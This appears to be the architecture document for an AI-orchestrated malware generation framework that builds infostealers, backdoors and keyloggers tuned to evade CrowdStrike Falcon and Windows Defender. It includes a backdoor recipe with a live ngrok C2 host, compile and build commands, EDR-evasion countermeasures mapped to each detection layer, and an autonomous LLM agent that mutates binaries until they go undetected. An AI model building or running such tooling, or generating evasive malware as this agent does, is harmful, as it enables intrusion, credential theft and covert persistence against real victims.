# Malware Generation Framework — Architecture Document

## 1. Overview

The Malware Generation Framework is a deterministic, chunk-based malware generation platform designed for authorized red team operations and EDR evasion research. It assembles pre-verified C source code chunks into complete malware binaries via declarative YAML recipes, applies polymorphic obfuscation, and validates the output against live enterprise EDR products.

### Key Numbers

| Metric | Value |
|--------|-------|
| Total code chunks | 335 (across 16 categories) |
| Evasion chunks | 110 |
| Recipes | 176 |
| Variant groups | 51 (199 interchangeable variants) |
| Unique binary combinations | 7.7 × 10²⁶ per recipe |
| Output formats | 6 (PE EXE, DLL, JScript, VBScript, Batch, CPL) |
| Hermes agent tools | 23 |
| Codebase | ~42K lines Python, ~25K lines C templates |
| Proven result | 207,827 bytes exfiltrated, 0 detections (CrowdStrike Falcon + Windows Defender) |

### Design Philosophy

The framework separates **strategy** (what evasion to apply) from **implementation** (the actual code). An LLM or human decides which recipe and evasion chunks to combine; the chunk assembler guarantees that the resulting code compiles and functions correctly. This separation was a deliberate pivot from an earlier LLM-generated-code architecture that suffered from non-deterministic output, ~60% compilation rates, and hallucinated evasion techniques.

---

## 2. Architecture

```
                          ┌──────────────────────────────────────────────┐
                          │              Hermes AI Orchestrator          │
                          │  (23 tools, LLM-driven, autonomous campaigns)│
                          └──────────┬──────────────┬───────────────────┘
                                     │              │
                          ┌──────────▼──────┐  ┌────▼─────────────┐
                          │  Knowledge DB   │  │  Strategy Engine  │
                          │ (knowledge.md,  │  │ (proven recipes,  │
                          │  recipe_results)│  │  EDR-specific     │
                          │                 │  │  recommendations) │
                          └──────────┬──────┘  └────┬─────────────┘
                                     │              │
                  ┌──────────────────▼──────────────▼──────────────┐
                  │              Chunk Assembler Pipeline           │
                  │                                                │
                  │  Recipe YAML ──► Dependency Resolution         │
                  │       ──► Template Variable Substitution       │
                  │       ──► Variant Randomization (optional)     │
                  │       ──► Single .c Source File                │
                  │       ──► Obfuscation (light/heavy/max)        │
                  │       ──► MinGW Cross-Compilation              │
                  │       ──► Resource Injection (version+manifest)│
                  │       ──► Rich Header Injection                │
                  │       ──► PE Timestamp Stomping                │
                  └────────────────────┬───────────────────────────┘
                                       │
                  ┌────────────────────▼───────────────────────────┐
                  │              VM Test Infrastructure             │
                  │                                                │
                  │  QEMU Windows 11 (CrowdStrike Falcon + Defender)│
                  │  SSH deploy ──► Execute ──► C2 Capture         │
                  │  Detection check ──► Mutate ──► Retry          │
                  │  blockdev-snapshot-sync for fast resets         │
                  └────────────────────┬───────────────────────────┘
                                       │
                  ┌────────────────────▼───────────────────────────┐
                  │              Output Package                    │
                  │                                                │
                  │  results/chunk_<type>_<timestamp>/             │
                  │    payload.exe, source.c, recipe.yaml,         │
                  │    deploy.sh, c2_server.py, build_info.txt     │
                  └────────────────────────────────────────────────┘
```

### Component Interaction

1. **Hermes** decides which recipe to use and which evasion chunks to apply, based on the target EDR and knowledge of proven/failed combinations.
2. The **Chunk Assembler** resolves dependencies, substitutes template variables, optionally randomizes variant groups, and produces a single compilable C source file.
3. The **Obfuscation Pipeline** applies source-level transforms (variable renaming, junk code, string encryption) to the assembled source.
4. **MinGW** cross-compiles the source to a Windows PE binary. Resource injection adds version info and a manifest to mimic legitimate software.
5. The binary is deployed to the **VM** via SSH, executed, and validated against CrowdStrike Falcon and Windows Defender.
6. Detection results feed back into Hermes, which mutates the recipe and retries until the binary evades all detection layers.

---

## 3. Chunk Assembler Pipeline

**File:** `templates/chunks/assembler.py` (1,450 lines)

The assembler is the core production engine. It reads a YAML recipe, resolves chunk dependencies, concatenates C source code in the correct order, substitutes template variables, and optionally compiles the result.

### Recipe Format

Recipes are declarative YAML files that specify which chunks to combine:

```yaml
name: backdoor_cs_ngrok
description: TCP backdoor tuned for CrowdStrike evasion via ngrok

core:
  - core/emit_buffer          # Shared output buffer
  - core/file_ops             # File read/write utilities

c2: c2/tcp_beacon             # Bidirectional TLV C2

commands:                      # Backdoor command handlers
  - commands/cmd_sysinfo
  - commands/cmd_processes
  - commands/cmd_filelist
  - commands/cmd_fileread
  - commands/cmd_filewrite
  - commands/cmd_screenshot
  - commands/cmd_netinfo
  - commands/cmd_exec

arch: arch/backdoor            # Execution architecture (beacon loop)
api_resolve: api_resolve/api_hash_ror13   # API resolution method
resources: true                # Inject version info + manifest

evasion:                       # Evasion techniques
  - evasion/etw_patch
  - evasion/stack_spoof
  - evasion/anti_sandbox
  - evasion/deferred_exec
  - evasion/behavioral_pacing

vars:
  C2_IP: "0.tcp.jp.ngrok.io"
  C2_PORT: "22301"
  BEACON_INTERVAL_MS: "30000"
```

### Chunk Format

Each chunk is a self-contained C source file with metadata headers:

```c
// chunk: evasion/etw_patch
// depends: (none)
// provides: patch_etw
// headers: windows.h
// risk: medium
// note: Patches EtwEventWrite to return 0 — blinds EDR ETW telemetry.

#ifndef CHUNK_ETW_PATCH
#define CHUNK_ETW_PATCH

void patch_etw(void) {
    // ... implementation
}

#endif
```

- **`depends:`** — other chunks this one requires (resolved automatically)
- **`provides:`** — functions/symbols this chunk exports
- **`headers:`** — required include files
- **`#ifndef` guards** — prevent duplicate inclusion when multiple chunks share dependencies

### Assembly Process

1. **Parse recipe** — read YAML, validate chunk references exist on disk
2. **Dependency resolution** — topological sort of all chunks based on `depends:` metadata
3. **Template variable substitution** — replace `{{C2_IP}}`, `{{C2_PORT}}`, etc. with values from the recipe's `vars:` section
4. **Variant randomization** (optional) — if `--randomize` is set, swap each chunk with a random alternative from its variant group (see Section 4)
5. **Header deduplication** — collect all `headers:` from all chunks, deduplicate, emit `#include` block
6. **Source concatenation** — emit chunks in dependency order into a single `.c` file
7. **Evasion init injection** — replace `{{EVASION_INIT}}` placeholder in the architecture chunk with calls to each evasion chunk's init function

### Compilation

```bash
x86_64-w64-mingw32-gcc -mwindows -o payload.exe source.c resource.o \
    -lws2_32 -liphlpapi -lcrypt32 -lole32 -lshell32 -lgdi32 \
    -lwininet -ldnsapi -static
```

- `-mwindows` + `FreeConsole()` in the arch chunk — no visible console window
- `-static` — no runtime DLL dependencies
- Resource object linked for version info + manifest

### Resource Injection

When `resources: true` is set in the recipe, the assembler:

1. Selects a random **resource profile** (e.g., "Disk Optimization", "Token Broker", "Windows Error Reporting") — each mimics a legitimate Microsoft utility with matching company name, product name, description, and file version
2. Generates a `.rc` resource script with `VERSIONINFO` and an XML manifest requesting `asInvoker` execution level
3. Compiles the `.rc` to a `.o` object via `x86_64-w64-mingw32-windres`
4. Links the resource object into the final binary

This defeats CrowdStrike's static ML model, which scores unsigned PE files without resources as high-risk.

### Rich Header Injection

After compilation, the assembler injects a synthetic Rich header into the PE file. The Rich header is a Microsoft-specific PE metadata structure that records compiler toolchain information. MinGW binaries have a distinctive Rich header (or none at all) that ML models can fingerprint. The injected header mimics Visual Studio 2019/2022 toolchain signatures.

### PE Timestamp Stomping

The PE `TimeDateStamp` field is overwritten with a random date between 2020-2023, preventing temporal clustering of framework-produced binaries.

---

## 4. Evasion System

### Chunk Categories

| Category | Count | Purpose |
|----------|-------|---------|
| `evasion/` | 110 | Evasion techniques (ETW bypass, sleep obfuscation, syscall gates, stack spoofing, anti-debug, anti-sandbox, ...) |
| `collectors/` | 42 | Data collection (system info, browsers, credentials, screenshots, clipboard, network, ...) |
| `arch/` | 26 | Execution architectures (sequential, threaded, fiber, callback, APC, backdoor, staged, ...) |
| `exfil/` | 22 | Exfiltration methods (TCP, HTTP, HTTPS, DNS, SMB, LOLBin, named pipe, ...) |
| `commands/` | 13 | Backdoor command handlers (sysinfo, processes, filelist, fileread, filewrite, screenshot, registry, netinfo, exec) |
| `process/` | 9 | Process evasion (PPID spoof × 6 parents, process ghosting, herpaderp, phantom DLL) |
| `api_resolve/` | 7 | Dynamic API resolution (DJB2, FNV-1a, CRC32, ROR13, PEB walk, LDR, API set redirect) |
| `persist/` | 7 | Persistence (registry Run, scheduled task, startup folder, service, COM hijack, WMI, DLL search order) |
| `ad_collectors/` | 6 | Active Directory reconnaissance (users, groups, computers, OUs, GPOs, SPNs) |
| `c2/` | 5 | C2 transports (TCP beacon, WinHTTP beacon, DNS C2, dead drop cloud, triggered pipe) |
| `core/` | 5 | Shared utilities (emit_buffer, run_cmd, file_ops, base64, string helpers) |
| `ad/` | 3 | AD infrastructure (LDAP connection, SID resolution, JSON builder) |

### Variant Groups

The variant system (`templates/chunks/variants.yaml`) defines 51 groups of functionally interchangeable chunks. When `--randomize` is used, the assembler randomly selects one member from each group, producing a structurally different binary every time.

Key variant groups:

| Group | Count | Members |
|-------|-------|---------|
| `syscall_gate` | 10 | indirect_syscall, hells_gate, halos_gate, tartarus_gate, recycled_gate, syswhispers3, syscall_knowndlls, syscall_win32u, syscall_trampoline, manual_syscall_stub |
| `sleep_obfuscation` | 8 | sleep_ekko, sleep_foliage, sleep_cronos, sleep_deathsleep, sleep_lazarus, sleep_morpheus, sleep_gargoyle, sleep_heap_encrypt |
| `stack_spoofing` | 7 | stack_spoof, thread_stack_spoof, ret_spoof, stack_spoof_gadget, stack_spoof_loudsunrun, stack_spoof_synthetic, stack_spoof_rop |
| `api_resolution` | 7 | api_hash_djb2, api_hash_fnv1a, peb_walk, api_hash_crc32, api_hash_ror13, ldr_get_proc, api_set_redirect |
| `anti_sandbox` | 7 | anti_sandbox, anti_sandbox_user, anti_sandbox_network, anti_sandbox_hardware, anti_vm, anti_sandbox_timing, anti_sandbox_artifacts |
| `etw_bypass` | 6 | etw_patch, hw_bp_etw, etw_buffer_corrupt, etw_full_patch, etw_provider_unreg, etw_session_stop |
| `anti_debug` | 6 | anti_debug, anti_debug_timing, anti_debug_hardware, anti_debug_ntquery, anti_debug_heap, anti_debug_tls |
| `arch_execution` | 7 | sequential, threaded, fiber, callback, apc_self, tp_work, tls_callback |
| `ppid_spoof` | 6 | ppid_explorer, ppid_svchost, ppid_runtimebroker, ppid_sihost, ppid_taskhostw, ppid_dllhost |
| `persistence` | 7 | registry_run, schtask, startup_folder, service_install, com_hijack, wmi_persist, dll_search_order |

**Combinatorial space:** 7.7 × 10²⁶ unique binary combinations from a single recipe with `--randomize`.

### Mapping to CrowdStrike Detection Layers

CrowdStrike Falcon detects malware across 6 layers. The framework has specific countermeasures for each:

| CS Detection Layer | What It Does | Framework Countermeasures | Status |
|-------------------|-------------|--------------------------|--------|
| **Static ML** | Scores PE structure: imports, entropy, Rich header, resources, file signature | Resource injection (version info + manifest), Rich header spoofing, entropy padding, IAT padding, timestamp stomping, section merge | **PROVEN** |
| **Userland Hooks** | Inline hooks on ntdll NT* functions, SSN scrambling | 10 syscall gate variants, 5 ntdll unhook methods, 2 AMSI bypass techniques | **PROVEN** |
| **Kernel Callbacks** | Process/thread/image/registry notifications via csagent.sys | Process masquerade, herpaderp, phantom DLL, 6 PPID spoof variants, process ghosting | **PARTIAL** |
| **Behavioral IOAs** | API call sequence patterns, process trees, memory operations | 8 sleep obfuscation, 7 stack spoof, 6 ETW bypass, 6 anti-debug, 7 anti-sandbox, 3 exec timing | **PROVEN** |
| **Cloud ML** | File reputation, threat intelligence, behavioral models | API resolution (hides suspicious imports), resources + manifest (required), multi-format output | **PROVEN** |
| **Memory Scanning** | Intel TDT, periodic PE header / injection scan | Header stomp, module stomp, sleep encryption (heap_encrypt) | **THEORETICAL** |

---

## 5. Obfuscation Pipeline

**Files:** `templates/chunks/obfuscate.py`, `evasion_passes.py`

Applied after assembly and before compilation. Four levels of increasing aggressiveness:

### Level: `none`
No transforms. Passthrough.

### Level: `light`
1. **Include sanitization** — deduplicate and reorder `#include` directives
2. **Polymorphic variable renaming** — local variables renamed to random 5-character names (protected list prevents renaming of `argc`, `argv`, Windows API handles, x86 mnemonics)
3. **Junk code injection** — volatile dead-code blocks inserted at 15% of control flow points (`GetTickCount()`, `GetCurrentProcessId()` calls that are immediately discarded)
4. **Control-flow junk** — bogus conditional branches guarded by opaque predicates (always-false conditions)
5. **Integer literal mutation** — numeric constants split into equivalent additions (`9001` → `(8934 + 67)`)
6. **`#define` string expansion** — macro string constants converted to `static char*` variables so string encryption can reach them
7. **String encryption** — all string literals XOR-encrypted with per-build random keys, decrypted on stack at runtime

### Level: `heavy`
All of `light`, plus:

8. **SEH wrapper** — moves `main()` body into a worker thread with `SetUnhandledExceptionFilter`, catches crashes gracefully
9. **Anti-debug injection** — `IsDebuggerPresent` + NtQueryInformationProcess timing checks at program start
10. **API call obfuscation** — sensitive API calls wrapped in LoadLibrary/GetProcAddress indirection

### Level: `max`
All of `heavy`, plus:

11. **LLM rewrite** — sends the entire source to a local LLM with instructions to rename all functions, reorder definitions, add realistic dead code paths, and split long functions. The rewritten code is compile-checked; if compilation fails, the LLM gets the error and retries (up to 3 attempts).

### Compilation Failure Recovery

When targeting an EDR, the assembler forces at least `light` obfuscation. If obfuscation breaks compilation (which can happen with complex chunk interactions), the system automatically falls back to the pre-obfuscation source and retries compilation. The binary is still unique due to variant randomization — obfuscation is an additional layer, not the only source of diversity.

---

## 6. Hermes AI Orchestrator

**Directory:** `hermes/`

The Hermes orchestrator connects the framework to the [Hermes agent framework](https://github.com/hermes-agent), providing an autonomous LLM-powered campaign loop. It uses the AIAgent class with 23 registered tools, continuous iteration (max_iterations=9999), and context compaction for long campaigns.

### Tools

| Tool | Purpose |
|------|---------|
| `scan_target` | Fingerprint the VM: OS version, EDR products, available LOLBins, network config |
| `list_edr_events` | Read Defender and CrowdStrike detection logs from the VM |
| `list_recipes` | Show all 176 recipes with proven/failed status |
| `list_chunks` | Show chunks in a specific category |
| `get_strategy` | Get EDR-specific strategy recommendations (format, evasion layers, what to avoid) |
| `query_knowledge` | Search the knowledge DB for proven recipes and failure patterns for a given EDR + malware type |
| `sweep_matrix` | Test multiple evasion dimension combinations systematically |
| `analyze_detection` | Classify a detection event (static, behavioral, cloud) and recommend counter-techniques |
| `assemble` | Build a binary from a recipe (auto-forces randomize + obfuscation for EDR targets) |
| `create_recipe` | Create a new recipe YAML from a list of chunks |
| `mutate_recipe` | Add/remove evasion chunks from an existing recipe |
| `deploy_to_vm` | SCP binary to VM, verify it wasn't quarantined on write |
| `start_c2_listener` | Start a TCP/HTTP C2 listener on the host |
| `read_file` | Read a file from the framework directory |
| `execute_on_vm` | Execute the deployed binary on the VM |
| `check_c2_data` | Check C2 listener for received data |
| `analyze_results` | Full post-execution analysis: binary exists? C2 data? detections? |
| `cleanup_vm` | Kill processes, delete binaries, remove scheduled tasks |
| `write_experimental_code` | Write new C code for novel evasion techniques (innovation engine) |
| `compile_experimental` | Compile experimental code to test if it works |
| `save_innovation_report` | Save successful innovations to the knowledge base |

### Campaign Flow

```
1. scan_target       → identify OS, EDR, available LOLBins
2. query_knowledge   → check proven recipes + failed patterns
3. get_strategy      → get EDR-specific format/evasion recommendations
4. list_recipes      → find matching recipes
5. assemble          → build binary (randomize=true forced for EDR targets)
6. start_c2_listener → start C2 on appropriate port/protocol
7. deploy_to_vm      → SCP to target, check static detection
   └─ If quarantined: mutate_recipe → assemble → deploy (retry)
8. execute_on_vm     → run the binary
9. analyze_results   → check C2 data + detections
   └─ If behavioral detection: analyze_detection → mutate → rebuild → retry
10. cleanup_vm       → remove artifacts
```

The campaign runs continuously. When targeting an EDR, `assemble` auto-forces `randomize=true` and at least `obfuscation=light` — the LLM cannot override this.

### Knowledge Persistence

- **`knowledge.md`** — operational lessons: SSH quirks, C2 timing, compilation gotchas, proven evasion combos
- **`hermes_knowledge.json`** — machine-readable proven/failed recipe results from Hermes campaigns
- **`results/recipe_results.json`** — structured test results for every recipe tested against each EDR

Knowledge persists across sessions. Hermes queries it at the start of every campaign to avoid repeating failed approaches and prioritize proven recipes.

### LLM Configuration

Hermes uses a smart server fallback system:

1. Probes the configured LLM server with a padded test payload (~12K tokens) using the specific model
2. If the server's context window is too small (e.g., Blackwell at 8K), falls back through a list of alternative servers
3. Auto-selects the correct model from available models on the chosen server

Default: local LLM on port 11235. Falls back to LM Studio on 1234, then other ports.

---

## 7. C2 Infrastructure

### TCP Beacon (TLV Protocol)

**File:** `templates/chunks/c2/tcp_beacon.c`

Bidirectional C2 using a simple Type-Length-Value binary protocol:

```
Header: [cmd_id: uint32] [payload_len: uint32]  (8 bytes)
Body:   [payload: payload_len bytes]
```

Commands:

| ID | Name | Direction | Payload |
|----|------|-----------|---------|
| 0x01 | HEARTBEAT | Both | 4-byte tick count |
| 0x02 | SYSINFO | Server→Client | None (client responds with system info text) |
| 0x03 | PROCESSES | Server→Client | None (client responds with process list) |
| 0x04 | FILELIST | Server→Client | Directory path |
| 0x05 | FILEREAD | Server→Client | File path |
| 0x06 | FILEWRITE | Server→Client | `path\x00content` |
| 0x07 | SCREENSHOT | Server→Client | None (client responds with BMP data) |
| 0x08 | REGISTRY | Server→Client | Registry key path |
| 0x09 | NETINFO | Server→Client | None |
| 0x0A | EXEC | Server→Client | Command string |
| 0x0B | EXEC_PS | Server→Client | PowerShell command |
| 0x0D | EXIT | Server→Client | None (client exits) |

The beacon loop runs with configurable intervals (default 30s) plus random jitter (0–90s). Connection failures trigger exponential backoff up to 100 retries before the process exits.

The `c2_connect()` function uses `getaddrinfo()` for DNS resolution, supporting both IP addresses and hostnames (e.g., ngrok tunnels).

### WinHTTP Beacon

**File:** `templates/chunks/c2/winhttp_beacon.c`

HTTP-based C2 that mimics legitimate web traffic. Uses `WinHttpOpen` with a standard browser User-Agent. Commands are sent as HTTP POST requests, responses as HTTP response bodies. Better for environments with egress filtering (only port 443 allowed).

### One-Shot Exfiltration

**Directory:** `templates/chunks/exfil/`

22 exfiltration methods for one-shot data collection (infostealers, keyloggers):

- **Direct:** `tcp_direct`, `http_post`, `https_post`
- **API-based:** `winhttp_get`, `winhttp_api`, `dns_exfil`, `dns_txt`
- **LOLBin:** `certutil`, `bitsadmin`, `powershell`, `cscript`, `mshta`, `curl`
- **Covert:** `smb_write`, `named_pipe`, `http_get_chunks`

---

## 8. VM Test Infrastructure

### QEMU Windows 11

- **Hypervisor:** QEMU/KVM with OVMF/UEFI + TPM 2.0 (`swtpm`)
- **OS:** Windows 11 Pro, fully patched
- **EDR:** CrowdStrike Falcon sensor + Windows Defender (both fully enabled)
- **Access:** SSH on port 10022 (`vmuser` / `vmuser123`), RDP on port 13389
- **Networking:** QEMU user-mode NAT (guest `10.0.2.2` → host)

### Snapshot Management

**File:** `scripts/vm_snapshot.sh`

Uses `blockdev-snapshot-sync` overlays via QMP (QEMU Monitor Protocol). This creates copy-on-write overlay files — the base disk image is never modified, and restoring a snapshot is instantaneous (replace overlay file + restart).

**Never use `savevm`/`loadvm`** — these crash the pflash (UEFI firmware) storage.

```bash
./scripts/vm_snapshot.sh save crowdstrike    # save clean state
./scripts/vm_snapshot.sh restore crowdstrike # restore to clean state
./scripts/vm_snapshot.sh list                # show available snapshots
```

The `crowdstrike` snapshot is the gold standard: CrowdStrike Falcon installed + Defender enabled + RDP configured.

### Deployment Flow

1. SCP binary to VM via SSH
2. Wait 3 seconds for on-write static scanning
3. Check if binary still exists (quarantined = static detection failure)
4. Execute via `cmd /c` or `start /b` (background)
5. C2 listener captures exfiltrated data
6. Post-execution checks: binary still on disk? Defender detections? CrowdStrike quarantine activity?
7. Cleanup: `taskkill`, `del`, `schtasks /delete`

---

## 9. Output Formats

### PE (EXE)
Primary format. Compiled from C via MinGW. Resource injection + Rich header + timestamp stomping. Used for infostealers, backdoors, keyloggers.

### DLL
Proxy DLL for sideloading attacks. Loaded by legitimate signed applications (e.g., `version.dll`, `winmm.dll`). Exports forwarded to the real DLL; payload runs in `DllMain`.

### JScript
`.js` files executed via `cscript.exe` (trusted Windows process). Bypasses PE-focused detection entirely. Used when PE format is heavily signatured. Proven against CrowdStrike.

### VBScript
`.vbs` files executed via `cscript.exe` or `wscript.exe`. Alternative to JScript with different syntax patterns.

### Batch
`.bat` files for simple reconnaissance. Uses LOLBins (`whoami`, `ipconfig`, `net user`, etc.) with output redirection.

### CPL
Control Panel applet (`.cpl`). Executed via `control.exe`. Functionally a DLL with a `CPlApplet` entry point.

---

## 10. CLI Reference

### Chunk Assembler

```bash
# Basic assembly (source only)
python3 templates/chunks/assembler.py templates/chunks/recipes/<recipe>.yaml \
    -o output.c

# Assembly + compilation
python3 templates/chunks/assembler.py templates/chunks/recipes/<recipe>.yaml \
    -o output.c --compile

# With randomization (different binary every time)
python3 templates/chunks/assembler.py templates/chunks/recipes/<recipe>.yaml \
    -o output.c --compile --randomize

# With variable overrides
python3 templates/chunks/assembler.py templates/chunks/recipes/<recipe>.yaml \
    -o output.c --compile --var C2_IP=1.2.3.4 --var C2_PORT=443
```

### Framework CLI

```bash
# Build from recipe (creates timestamped package in results/)
python -m malware_gen_framework chunk --recipe infostealer_full --compile

# Build + randomize + obfuscate
python -m malware_gen_framework chunk --recipe infostealer_full --compile \
    --randomize --obfuscate heavy

# Build + deploy + test on VM
python -m malware_gen_framework chunk --recipe infostealer_full --compile \
    --randomize --obfuscate heavy --test

# Launch web portal
python -m malware_gen_framework portal --port 7070 --host 0.0.0.0
```

### Hermes Autonomous Campaign

```bash
# Launch campaign against CrowdStrike
python -m hermes --edr crowdstrike --malware-type infostealer --max-rounds 50
```

### Obfuscation Standalone

```bash
# Obfuscate an assembled source file
python3 templates/chunks/obfuscate.py source.c -o obfuscated.c -l heavy
```

---

## 11. Key Files Reference

### Core Pipeline

| File | Lines | Purpose |
|------|-------|---------|
| `templates/chunks/assembler.py` | 1,450 | Chunk assembler: YAML → C → binary |
| `templates/chunks/obfuscate.py` | 266 | Post-assembly obfuscation dispatcher |
| `evasion_passes.py` | 1,096 | Obfuscation transforms (rename, junk, string encrypt, SEH, anti-debug) |
| `cli.py` | 1,027 | CLI entry point |
| `compiler_selector.py` | — | Compiler backend selection (MinGW, Zig) |

### Hermes Orchestrator

| File | Lines | Purpose |
|------|-------|---------|
| `hermes/tools.py` | 2,038 | 23 tool implementations (scan, assemble, deploy, analyze, ...) |
| `hermes/prompts.py` | 742 | Tool schemas + system prompt for the LLM agent |
| `hermes/hermes_agent_bridge.py` | 341 | Bridge to Hermes AIAgent framework |
| `hermes/strategy.py` | — | EDR-specific strategy recommendations |
| `hermes/config.py` | — | Configuration management |
| `hermes/knowledge_db.py` | — | Knowledge base queries |
| `hermes/innovation.py` | — | Experimental code generation engine |

### Portal

| File | Lines | Purpose |
|------|-------|---------|
| `portal/app.py` | 2,171 | Flask web UI + WebSocket server |
| `portal/static/index.html` | — | Single-page frontend |
| `portal/c2_listener.py` | — | HTTP/TCP C2 listener for portal integration |

### Templates

| Path | Purpose |
|------|---------|
| `templates/chunks/recipes/` | 176 YAML recipe files |
| `templates/chunks/variants.yaml` | 51 variant group definitions |
| `templates/chunks/evasion/` | 110 evasion chunk C files |
| `templates/chunks/collectors/` | 42 data collector C files |
| `templates/chunks/arch/` | 26 execution architecture C files |
| `templates/chunks/exfil/` | 22 exfiltration method C/JS files |
| `templates/chunks/commands/` | 13 backdoor command handler C files |
| `templates/chunks/c2/` | 5 C2 transport C files |

### Knowledge & Results

| File | Purpose |
|------|---------|
| `knowledge.md` | Operational lessons and proven evasion techniques |
| `hermes_knowledge.json` | Machine-readable campaign results |
| `results/` | Timestamped output packages (binary + source + recipe + deploy scripts) |

### Scripts

| File | Purpose |
|------|---------|
| `scripts/vm_snapshot.sh` | QMP-based VM snapshot save/restore |
| `scripts/c2_backdoor.py` | Interactive backdoor C2 controller |
| `scripts/deploy_keylogger.sh` | Automated keylogger deployment with RDP |
| `scripts/deploy_infostealer.sh` | Automated infostealer deployment |
| `scripts/deploy_backdoor.sh` | Automated backdoor deployment |
| `scripts/parse_exfil.py` | Parse raw C2 capture into individual files |
| `scripts/batch_fud_test.py` | Batch test multiple variants against EDR |
| `scripts/fud_collector.py` | Collect FUD variants at scale |
